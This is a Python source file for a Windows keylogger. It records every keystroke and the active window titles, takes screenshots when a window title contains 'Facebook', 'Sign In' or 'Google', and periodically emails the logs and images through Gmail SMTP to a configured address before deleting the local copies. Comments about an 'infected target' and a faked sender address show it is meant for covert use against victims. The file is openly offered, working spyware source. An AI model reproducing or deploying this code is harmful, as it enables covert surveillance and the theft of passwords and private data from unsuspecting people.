#!/usr/bin/python

# * Records all keystrokes
# * Takes automated screenshots (see config below)
# * Sends email containing logs and screenshots


# Required modules
# ----------------
# Make sure they're all installed if you plan to compile it yourself.

# Python 3.5		--		http://Python.org
# PyWin32			--		http://sourceforge.net/projects/pywin32/
# Python Img. Lib.  --		http://www.pythonware.com/products/pil/
# PyHook			--		http://sourceforge.net/apps/mediawiki/pyhook/index.php?title=Main_Page
from threading import Timer
from threading import Thread
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import subprocess, socket, base64, time, datetime, os, sys, urllib, platform
import pythoncom, pyHook,win32api, win32gui, win32con, smtplib
#from PIL import ImageTk
from PIL import ImageGrab


# Keylogger settings
#################################
# Email Settings				#
LOG_SENDMAIL = True			# set to True to send emails
LOG_MAIL = 'Youremail@gmail.com'  	# account email address (must exist)
LOG_PASS = 'password_for_this_email'			# email's password (must exist)
LOG_FROM = 'anymail@gmail.com'		# email will be sent from this address (fake) - useful to identify infected target =)
LOG_SUBJ = 'KeyLogger details'# email subject
LOG_MSG = 'here is the body'				# email content - the body
# ----------------------------- #
# Screenshot Settings			#
LOG_SCREENSHOT = True			# set to True to take screenshot(s)
LOG_SCREENSNUM = 3				# set amount of screenshot to take.
LOG_INTERVAL = 5				# interval between each screenshot.
LOG_SCREEN = []					# this list contains matches for taking automated screenshots...
LOG_SCREEN.append("Facebook")	# for example, if it finds "Facebook" in titlebar..
LOG_SCREEN.append("Sign In")	# or if it finds "Sign In", common email login page.
LOG_SCREEN.append("Google")		# -- 'watchu googlin fool?
# ----------------------------- #
# System Settings				# [shouldn't be modified]
LOG_FILENAME = 'tmpConf123.txt'	# log file (current directory)
LOG_TOSEND = []					# contains files to send in email attachment
LOG_ACTIVE = ''					# stores active window
LOG_STATE = False				# Start keylogger as false
LOG_TIME = 0					# amount of time to log in seconds, where 0 = infinite and 86400 = 1 day
LOG_TEXT = ""					# this is the raw log var which will be written to file
LOG_TEXTSIZE = 3				# marks the beginning and end of new text blocks that separate logs
LOG_MINTERVAL = 60			# main loop intervals in seconds, where 86400 = 1 day (default)
LOG_THREAD_kl = 0				# thread count for keylogger
LOG_THREAD_ss = 0				# thread count for automated screenshots
# ----------------------------- #
# Debug [Don't change]			#
# LOG_ITERATE = 3				#
# print os.getcwd()				#
#################################

# this sets the thread ID before execution.
main_thread_id = win32api.GetCurrentThreadId()

def Keylog(k, LOG_TIME, LOG_FILENAME):
	# only supported for Windows at the moment...
	if os.name != 'nt': return "Not supported for this operating system.\n"
	global LOG_TEXT, LOG_FILE, LOG_STATE, LOG_ACTIVE, main_thread_id
	LOG_STATE = True # begin logging!
	main_thread_id = win32api.GetCurrentThreadId()
	# add timestamp when it starts...
	LOG_TEXT += "\n===================================================\n"
	LOG_DATE = datetime.datetime.now()
	LOG_TEXT += ' ' + str(LOG_DATE) + ' >>> Logging started.. |\n'
	LOG_TEXT += "===================================================\n\n"
	# find out which window is currently active!
	w = win32gui
	LOG_ACTIVE = w.GetWindowText (w.GetForegroundWindow())
	LOG_DATE = datetime.datetime.now()
	LOG_TEXT += "[*] Window activated. [" + str(LOG_DATE) + "] \n"
	LOG_TEXT += "=" * len(LOG_ACTIVE) + "===\n"
	LOG_TEXT += " " + LOG_ACTIVE + " |\n"
	LOG_TEXT += "=" * len(LOG_ACTIVE) + "===\n\n"
	if LOG_TIME > 0:
		t = Timer(LOG_TIME, stopKeylog) # Quit
		t.start()
	# open file to write
	LOG_FILE = open(LOG_FILENAME, 'w')
	LOG_FILE.write(LOG_TEXT)
	LOG_FILE.close()
	hm = pyHook.HookManager()
	hm.KeyDown = OnKeyboardEvent
	hm.HookKeyboard()
	pythoncom.PumpMessages() # this is where all the magic happens! ;)
	# after finished, we add the timestamps at the end.
	LOG_FILE = open(LOG_FILENAME, 'a')
	LOG_TEXT += "\n\n===================================================\n"
	LOG_DATE = datetime.datetime.now()
	LOG_TEXT += " " + str(LOG_DATE) + ' >>> Logging finished. |\n'
	LOG_TEXT += "===================================================\n"
	LOG_STATE = False
	try: 
		LOG_FILE.write(LOG_TEXT)
		LOG_FILE.close()
	except:
		LOG_FILE.close()
	return True
	
# this function stops the keylogger...
# thank God for the StackOverflow thread! :D
def stopKeylog():
    win32api.PostThreadMessage(main_thread_id, win32con.WM_QUIT, 0, 0);

# this function actually records the strokes...
def OnKeyboardEvent(event):
	global LOG_STATE, LOG_THREAD_ss
	# return if it isn't logging.
	if LOG_STATE == False: return True
	global LOG_TEXT, LOG_FILE, LOG_FILENAME, LOG_ACTIVE, LOG_INTERVAL, LOG_SCREENSHOT, LOG_SCREENSNUM
	LOG_TEXT = ""
	LOG_FILE = open(LOG_FILENAME, 'a')
	# check for new window activation
	wg = win32gui
	LOG_NEWACTIVE = wg.GetWindowText (wg.GetForegroundWindow())
	if LOG_NEWACTIVE != LOG_ACTIVE:
		# record it down nicely...
		LOG_DATE = datetime.datetime.now()
		LOG_TEXT += "\n\n[*] Window activated. [" + str(LOG_DATE) + "] \n"
		LOG_TEXT += "=" * len(LOG_NEWACTIVE) + "===\n"
		LOG_TEXT += " " + LOG_NEWACTIVE + " |\n"
		LOG_TEXT += "=" * len(LOG_NEWACTIVE) + "===\n\n"
		LOG_ACTIVE = LOG_NEWACTIVE
		# take screenshots while logging!
		if LOG_SCREENSHOT == True:
			LOG_IMG = 0
			while LOG_IMG < len(LOG_SCREEN):
				if LOG_NEWACTIVE.find(LOG_SCREEN[LOG_IMG]) > 0:
					LOG_TEXT += "[*] Taking " + str(LOG_SCREENSNUM) + " screenshot for \"" + LOG_SCREEN[LOG_IMG] + "\" match.\n"
					LOG_TEXT += "[*] Timestamp: " + str(datetime.datetime.now()) + "\n\n"
					ss = Thread(target=takeScreenshots, args=(LOG_THREAD_ss,LOG_SCREENSNUM,LOG_INTERVAL))
					ss.start()
					LOG_THREAD_ss += 1 # add 1 to the thread counter
				LOG_IMG += 1
		LOG_FILE.write(LOG_TEXT)
	
	LOG_TEXT = ""	
	if event.Ascii == 8: LOG_TEXT += "\b"
	elif event.Ascii == 13 or event.Ascii == 9: LOG_TEXT += "\n"
	else: LOG_TEXT += str(chr(event.Ascii))
	# write to file
	LOG_FILE.write(LOG_TEXT) 
	LOG_FILE.close()
	
	return True

# screenshot function
def Screenshot():
	img=ImageGrab.grab()
	saveas=os.path.join(time.strftime('%Y_%m_%d_%H_%M_%S')+'.png')
	img.save(saveas)
	if LOG_SENDMAIL == True:
		addFile = str(os.getcwd()) + "\\" + str(saveas)
		LOG_TOSEND.append(addFile) # add to the list

# take multiple screenshots function
# args = number of shots, interval between shots
def takeScreenshots(i, maxShots, intShots):
	shot = 0
	while shot < maxShots:
		shottime = time.strftime('%Y_%m_%d_%H_%M_%S')
		Screenshot()
		time.sleep(intShots)
		shot += 1
	

# send email function
# this example is for GMAIL, if you use a different server
# you MUST change the line below to the server/port needed
# server = smtplib.SMTP('smtp.gmail.com:587')
def sendEmail():
	msg = MIMEMultipart()
	msg['Subject'] = LOG_SUBJ
	msg['From'] = LOG_FROM
	msg['To'] = LOG_MAIL
	msg.preamble = LOG_MSG
	# attach each file in LOG_TOSEND list  
	for file in LOG_TOSEND:
		# attach text file
		if file[-4:] == '.txt':
			fp = open(file)
			attach = MIMEText(fp.read())
			fp.close()
		# attach images
		elif file[-4:] == '.png':
			fp = open(file, 'rb')
			attach = MIMEImage(fp.read())
			fp.close()
		attach.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file))
		msg.attach(attach)
		
	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()  
	server.login(LOG_MAIL, LOG_PASS)
	server.sendmail(LOG_FROM, LOG_MAIL, msg.as_string())  
	server.quit()

# function to clean up fiels
def deleteFiles():
	if len(LOG_TOSEND) < 1: return True
	for file in LOG_TOSEND:
		os.unlink(file)
	

# begin keylogging
kl = Thread(target=Keylog, args=(LOG_THREAD_kl,LOG_TIME,LOG_FILENAME))
kl.start()
	
# if keylogging is running infinitely
if LOG_TIME < 1:
	# begin continuous loop
	while True:
		
		# zZzzzzZZzzZ
		time.sleep(LOG_MINTERVAL) # sleep for time specified
		
		LOG_NEWFILE = time.strftime('%Y_%m_%d_%H_%M_%S') + ".txt"
		# add file to the LOG_TOSEND list
		if LOG_SENDMAIL == True:
			addFile = str(os.getcwd()) + "\\" + str(LOG_NEWFILE)
			LOG_TOSEND.append(addFile) # add to the list
		
		LOG_SAVEFILE = open(LOG_NEWFILE, 'w')
		LOG_CHCKSIZE = open(LOG_FILENAME, 'r')
		LOG_SAVEFILE.write(LOG_CHCKSIZE.read())
		LOG_CHCKSIZE.close()
		try:
			LOG_SAVEFILE.write(LOG_SAVETEXT)
			LOG_SAVEFILE.close()
		except:
			LOG_SAVEFILE.close()
		
		# send email
		if LOG_SENDMAIL == True:
			sendEmail()
			time.sleep(6)
			deleteFiles()
		LOG_TOSEND = [] # clear this list
		
		
# otherwise sleep for specified time, then break program
elif LOG_TIME > 0:
	# sleep for time specified
	time.sleep(LOG_TIME)
	time.sleep(2)
	# check to send email
	if LOG_SENDMAIL == True:
		addFile = str(os.getcwd()) + "\\" + str(LOG_FILENAME)
		LOG_TOSEND.append(addFile) # add to the list
		sendEmail()
	time.sleep(2)

sys.exit()
	
